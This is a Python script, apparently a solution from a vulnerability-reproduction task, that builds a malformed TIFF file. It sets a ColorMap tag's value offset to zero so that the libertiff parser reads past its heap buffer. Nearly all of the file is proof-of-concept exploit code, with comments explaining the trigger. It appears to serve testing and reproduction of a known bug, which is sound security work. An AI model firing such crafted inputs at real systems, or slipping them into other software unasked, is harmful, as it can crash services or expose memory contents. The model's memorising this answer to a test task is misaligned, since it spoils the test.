import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability described is a Heap Buffer Overflow in libertiff
        # triggered by invalid offline tags with a value offset of zero.
        # "Offline" tags are tags whose value size exceeds 4 bytes, requiring
        # the Value/Offset field to point to the data location in the file.
        # If this offset is 0, it points to the file header. If the tag requires
        # a large amount of data (e.g. ColorMap), the parser may read past
        # the bounds of the buffer containing the file data or allocated heap memory.

        # Construct a minimal valid TIFF header
        # Byte Order: Little Endian ('II')
        # Version: 42
        # Offset to first IFD: 8
        poc = b'II\x2a\x00\x08\x00\x00\x00'

        # IFD Entries
        # We need to construct a valid IFD with mandatory tags to ensure
        # the parser processes the file up to the point of reading the malicious tag.
        # We use PhotometricInterpretation = 3 (Palette Color) which requires a ColorMap tag.
        # The ColorMap tag is typically large (3 * 2^BitsPerSample entries).
        
        entries = []

        # Tag 256: ImageWidth, Type SHORT (3), Count 1, Value 1
        entries.append(struct.pack('<HHII', 256, 3, 1, 1))

        # Tag 257: ImageLength, Type SHORT (3), Count 1, Value 1
        entries.append(struct.pack('<HHII', 257, 3, 1, 1))

        # Tag 258: BitsPerSample, Type SHORT (3), Count 1, Value 8
        entries.append(struct.pack('<HHII', 258, 3, 1, 8))

        # Tag 259: Compression, Type SHORT (3), Count 1, Value 1 (None)
        entries.append(struct.pack('<HHII', 259, 3, 1, 1))

        # Tag 262: PhotometricInterpretation, Type SHORT (3), Count 1, Value 3 (Palette)
        # This forces the parser to look for and read the ColorMap (Tag 320).
        entries.append(struct.pack('<HHII', 262, 3, 1, 3))

        # Tag 273: StripOffsets, Type LONG (4), Count 1, Value 8
        # Pointing to valid readable memory (header) to avoid early crash
        entries.append(struct.pack('<HHII', 273, 4, 1, 8))

        # Tag 277: SamplesPerPixel, Type SHORT (3), Count 1, Value 1
        entries.append(struct.pack('<HHII', 277, 3, 1, 1))

        # Tag 278: RowsPerStrip, Type SHORT (3), Count 1, Value 1
        entries.append(struct.pack('<HHII', 278, 3, 1, 1))

        # Tag 279: StripByteCounts, Type LONG (4), Count 1, Value 1
        entries.append(struct.pack('<HHII', 279, 4, 1, 1))

        # Tag 320: ColorMap, Type SHORT (3)
        # Count = 3 * (2^8) = 768 entries.
        # Size = 768 * 2 = 1536 bytes.
        # This size > 4 bytes, so it is an "offline" tag.
        # Offset = 0. This is the vulnerability trigger.
        # The parser will attempt to read 1536 bytes from offset 0.
        # Since the file is small (~134 bytes), this causes a Heap Buffer Overflow (Read).
        entries.append(struct.pack('<HHII', 320, 3, 768, 0))

        # Add number of entries (2 bytes)
        poc += struct.pack('<H', len(entries))

        # Add all entries (12 bytes each)
        for entry in entries:
            poc += entry

        # Add Next IFD Offset (4 bytes) - 0 for end of chain
        poc += struct.pack('<I', 0)

        return poc